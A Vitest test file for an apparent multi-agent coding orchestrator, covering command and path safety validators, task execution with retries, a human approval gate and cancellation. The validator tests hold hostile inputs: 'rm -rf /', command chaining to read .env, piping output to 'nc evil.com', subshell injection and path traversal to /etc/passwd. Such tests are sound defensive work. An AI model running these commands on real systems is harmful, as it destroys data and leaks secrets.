import { describe, it, expect } from 'vitest';
import {
  validateCommandSafety,
  validatePathSafety
} from './safetyValidator.js';
import {
  ensureHiveStructure,
  loadHiveTasks,
  loadBlackboardEntries
} from './hiveStorage.js';
import {
  createDevelopmentTask,
  executeDevelopmentTask,
  handleApprovalDecision,
  getPendingApprovals,
  getTimelineEvents,
  cancelDevelopmentTask
} from './orchestratorService.js';

describe('Development Task Orchestrator & Munder Difflin Hive Protocol', () => {
  it('enforces safety rails by allowing safe commands and blocking destructive commands', () => {
    expect(validateCommandSafety('pnpm test').allowed).toBe(true);
    expect(validateCommandSafety('pnpm build').allowed).toBe(true);
    expect(validateCommandSafety('git status').allowed).toBe(true);
    expect(validateCommandSafety('git diff').allowed).toBe(true);

    const destructiveRm = validateCommandSafety('rm -rf /');
    expect(destructiveRm.allowed).toBe(false);
    expect(destructiveRm.isDestructive).toBe(true);

    const destructiveDrop = validateCommandSafety('drop database prod_db');
    expect(destructiveDrop.allowed).toBe(false);

    expect(validatePathSafety(['apps/web/src/components/MyComp.tsx']).allowed).toBe(true);
    expect(validatePathSafety(['.env']).allowed).toBe(false);
    expect(validatePathSafety(['.git/HEAD']).allowed).toBe(false);
  });

  it('blocks command injection, chaining, and subshell expansion attempts', () => {
    // Semicolon chaining
    const semi = validateCommandSafety('pnpm test; rm -rf /');
    expect(semi.allowed).toBe(false);
    expect(semi.isDestructive).toBe(true);

    // Logical AND chaining
    const andChain = validateCommandSafety('pnpm test && cat .env');
    expect(andChain.allowed).toBe(false);
    expect(andChain.isDestructive).toBe(true);

    // Pipe redirection
    const pipe = validateCommandSafety('git status | nc evil.com 1337');
    expect(pipe.allowed).toBe(false);
    expect(pipe.isDestructive).toBe(true);

    // Subshell evaluation
    const subshell = validateCommandSafety('git status `whoami`');
    expect(subshell.allowed).toBe(false);
    expect(subshell.isDestructive).toBe(true);

    // Output redirection
    const redir = validateCommandSafety('git status > secret.txt');
    expect(redir.allowed).toBe(false);

    // Path traversal in path validation
    expect(validatePathSafety(['../../etc/passwd']).allowed).toBe(false);
    expect(validatePathSafety(['apps/web/../../.env']).allowed).toBe(false);
    expect(validatePathSafety(['packages/../.git/config']).allowed).toBe(false);
  });

  it('initializes the Munder Difflin Hive structure and verifies default files', () => {
    const hivePath = ensureHiveStructure();
    expect(hivePath).toContain('munder-difflin');

    const blackboard = loadBlackboardEntries();
    expect(blackboard.length).toBeGreaterThan(0);
    expect(blackboard.some((b) => b.topic.includes('HIVE_BLACKBOARD'))).toBe(true);
  });

  it('creates, executes, and audits a full multi-agent development task workflow with live timeline', async () => {
    // 1. Create Task
    const task = createDevelopmentTask('Refactor 3D digital twin viewport camera reset hotkeys');
    expect(task.id).toMatch(/^MD-TASK-/);
    expect(task.squad.length).toBe(5);

    // Verify initial timeline events
    expect(task.timeline.length).toBeGreaterThanOrEqual(2);
    expect(task.timeline[0]?.status).toBe('COMPLETED'); // Supervisor init
    expect(task.timeline[1]?.status).toBe('RUNNING'); // Lead planning

    // Verify Supervisor is Michael
    const supervisor = task.squad.find((s) => s.assignedRole === 'SUPERVISOR');
    expect(supervisor?.name).toContain('Michael');

    // Verify Lead is 3D specialist
    const lead = task.squad.find((s) => s.assignedRole === 'LEAD_SPECIALIST');
    expect(lead?.id).toBe('agency-3d-scene-developer');

    // 2. Verify Worktree created
    expect(task.worktree.branchName).toContain('feat/agent-task');
    expect(task.worktree.isCleanedUp).toBe(false);

    // 3. Execute Task through stages with simulated retry
    const executedTask = await executeDevelopmentTask(task.id, { simulateRetry: true });
    expect(executedTask.status).toBe('AWAITING_APPROVAL');
    expect(executedTask.codeReview?.passed).toBe(true);
    expect(executedTask.securityReview?.passed).toBe(true);
    expect(executedTask.testResults?.passed).toBe(true);
    expect(executedTask.executionLogs.length).toBeGreaterThan(3);

    // Verify retry timeline event was captured
    const retryEvent = executedTask.timeline.find((e) => e.status === 'RETRYING');
    expect(retryEvent).toBeDefined();
    expect(retryEvent?.errorDetails?.retryCount).toBe(1);
    expect(retryEvent?.errorDetails?.maxRetries).toBe(3);
    expect(retryEvent?.errorDetails?.code).toBe('ERR_PROVIDER_RATE_LIMIT');

    // 4. Query Timeline Events
    const queryByTask = getTimelineEvents({ taskId: task.id });
    expect(queryByTask.total).toBeGreaterThanOrEqual(6);
    expect(queryByTask.events.every((e) => e.taskId === task.id)).toBe(true);

    const queryByStatus = getTimelineEvents({ taskId: task.id, status: 'COMPLETED' });
    expect(queryByStatus.events.every((e) => e.status === 'COMPLETED')).toBe(true);

    // 5. Verify Pending Human Approvals Queue
    const pending = getPendingApprovals();
    expect(pending.some((p) => p.taskId === task.id)).toBe(true);

    // 6. Human Approval Gate
    const approvedTask = handleApprovalDecision(
      task.id,
      'APPROVE',
      'alex@nexus-omega.ai',
      'Verified 3D hotkey logic and tests pass.'
    );
    expect(approvedTask.status).toBe('COMPLETED');
    expect(approvedTask.humanApproval.status).toBe('APPROVED');
    expect(approvedTask.humanApproval.reviewedBy).toBe('alex@nexus-omega.ai');
    expect(approvedTask.worktree.isCleanedUp).toBe(true);

    // 7. Verify Task persisted in Hive ledger
    const tasks = loadHiveTasks();
    const persisted = tasks.find((t) => t.id === task.id);
    expect(persisted).toBeDefined();
    expect(persisted?.status).toBe('COMPLETED');
    expect(persisted?.timeline.length).toBeGreaterThan(5);
  });

  it('supports task cancellation with safe worktree cleanup and cancellation timeline event', () => {
    const task = createDevelopmentTask('Temporary task to be cancelled by operator');
    expect(task.status).toBe('PLANNING');
    expect(task.worktree.isCleanedUp).toBe(false);

    const cancelledTask = cancelDevelopmentTask(task.id, 'security-admin@nexus-omega.ai', 'Scope revised by architecture board');
    expect(cancelledTask.status).toBe('CANCELLED');
    expect(cancelledTask.worktree.isCleanedUp).toBe(true);

    const cancelTimelineEvent = cancelledTask.timeline.find((e) => e.status === 'CANCELLED');
    expect(cancelTimelineEvent).toBeDefined();
    expect(cancelTimelineEvent?.errorDetails?.message).toContain('Scope revised');

    // Cancelling an already cancelled task is idempotent
    const idempotent = cancelDevelopmentTask(task.id);
    expect(idempotent.status).toBe('CANCELLED');
  });
});
